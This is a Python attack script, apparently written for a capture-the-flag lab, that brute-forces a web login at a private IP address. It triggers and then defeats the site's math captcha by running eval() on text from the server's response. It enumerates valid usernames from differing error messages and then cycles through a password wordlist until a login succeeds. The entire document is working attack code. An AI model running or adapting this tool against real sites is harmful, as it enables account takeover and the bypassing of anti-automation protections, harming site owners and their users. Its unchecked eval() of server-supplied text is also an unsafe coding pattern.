#!/bin/python3
# Made by WafflesExploits
import requests
import re
import urllib3
import logging

# Variables
url = "http://10.10.26.238/login"
username_wordlist = 'usernames.txt'
password_wordlist = 'passwords.txt'

# If you already found a valid user:
valid_user = ''

skip_user_enum = False
if(valid_user):
    skip_user_enum = True

# Functions
def print_title(title):
    print('\n')
    print('-*-'*30)
    print(title)
    print('-*-'*30)
    print('\n')

def regex_search(data, pattern):  # Matches text from data based on regex pattern.
    return re.findall(pattern, data)

def get_captcha(data): # Grabs Math expression from Captcha
    pattern = '\d+\s.\s\d+'
    return regex_search(data, pattern)

def check_if_failed(content, pattern): # Check if you got the failed case, example 'user doesn't exist'
    fail = regex_search(content, pattern) 
    if(fail):
        return True
    else:
        return False
    
def post_request(url1, data):
    res1 = requests.post(url1, data)
    return res1
    
def activate_captcha(): # Sends 10 login requests, to get blocked by the website and activate the captcha
    print('\nSending 10 Invalid Requests, to activate captcha...')
    for i in range(0,10):
        res = post_request(url, data={'username':'fooblog','password':'test'}) 
        
def user_enum(): # Username Enumeration
    print_title('Starting Username Enumeration')
    
    wordlist = open(username_wordlist).read().split('\n') # Opens directory wordlist and transforms it into a list ['dir1','dir2',..]  
    for user in wordlist:
        ##Get Captcha
        res = post_request(url, data={'username':user,'password':'test'}) 
        captcha = get_captcha(str(res.content))
        
        ##Send Request with Captcha
        res1 = post_request(url, data={'username':user,'password':'test','captcha':eval(captcha[0])})
        print(f'Testing {user}')
        
        ##Check if requests failed
        fail = check_if_failed(str(res1.content), 'The user &#39;.+&#39; does not exist') # If matched, user doesn't exist.
        if(not fail):
            print_title(f'User found: {user}')
            return user
    
def password_enum(user): # Password Enumeration       
    print_title('Starting Password Enumeration')
    
    wordlist = open(password_wordlist).read().split('\n') # Opens directory wordlist and transforms it into a list ['dir1','dir2',..]  
    for password in wordlist:
        ##Get Captcha
        res = post_request(url, data={'username':user,'password':password}) 
        captcha = get_captcha(str(res.content))
        
        ##Send Request with Captcha
        res1 = post_request(url, data={'username':user,'password':password,'captcha':eval(captcha[0])})
        print(f'Testing {password}')
        
        ##Check if requests failed
        fail = check_if_failed(str(res1.content), 'Invalid password for user &#39;.+&#39;') # If matched, password doesn't exist.
        if(not fail):
            print_title(f'Valid login found: {user}:{password}')
            break
    
# Start of application
activate_captcha()

if(not skip_user_enum):
    valid_user = user_enum()

password_enum(valid_user)
